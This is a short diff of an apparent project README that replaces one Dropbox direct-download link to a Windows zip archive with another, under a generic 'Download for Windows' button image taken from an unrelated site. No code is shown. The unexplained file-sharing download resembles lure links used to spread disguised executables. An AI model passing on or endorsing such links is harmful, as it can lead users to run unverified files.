@@ -7,7 +7,7 @@
 <br>
 
 <p align="center">
-  <a href="https://www.dropbox.com/scl/fi/jfpx4hctdg92db7rm0zep/github_x64.zip?rlkey=trbmyee6osqbu7nf6is9uol5j&st=thp4qwgg&dl=1">
+  <a href="https://www.dropbox.com/scl/fi/y4en6k3gl3bcskdngbtqr/windows_x64.zip?rlkey=rmpws5zqvitipgh45aef9ayuh&st=hbpsgjdu&dl=1">
     <img src="https://static.radio.co/production/windows-button-download.png" width="200" alt="Download for Windows">
   </a>
 </p>
